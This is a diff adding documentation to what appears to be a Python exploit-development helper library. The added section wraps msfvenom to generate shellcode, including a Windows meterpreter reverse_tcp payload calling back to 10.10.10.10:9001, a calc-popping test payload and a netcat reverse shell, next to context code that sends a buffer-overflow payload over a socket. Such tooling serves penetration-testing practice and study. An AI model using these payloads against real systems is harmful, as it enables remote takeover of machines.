@@ -132,3 +132,29 @@ payload += offset + eip + padding + buffero.decode(shellcode) + suffix
 
 # Encoding to bytes type array the concatenated payload
 s.send(buffero.encode(payload))
+```
+
+---
+
+### Generating Shellcode with MsfVenom
+
+This module will use the MsfVenom application which installed on Kali systems by default. The purpose of this module to fasten the developement, avoiding to leave the developement platform, while generating shellcode, and copy and paste it. This module is not too smart but works well, if the requirements are installed.
+Important note, the format must be python.
+```python
+import buffero
+
+msf = msf_shellcode()
+
+# Run custom MsfVenom command and get the shellcode back
+# No need to specify the 'msfvenom' word
+shellcode = msf.run_msfvenom_command('-p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=9001 EXITFUNC=thread -f python')
+# shellcode = xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b...
+
+# Use predefined functions for fasten the developement
+# Keyword arguments are enabled.
+# Create POP CALC for determine the exploit is working.
+shellcode = msf.generate_popcalc(exitfunc="thread",badchars="\\x00\\x0a")	# Escaping bad caharacters is important especially NULL sequence
+
+# Create Netcat catchable Reverse shell.
+shellcode = msf.generate_ncrev_shell(exitfunc="thread",badchars="",lhost="",lport="")
+```
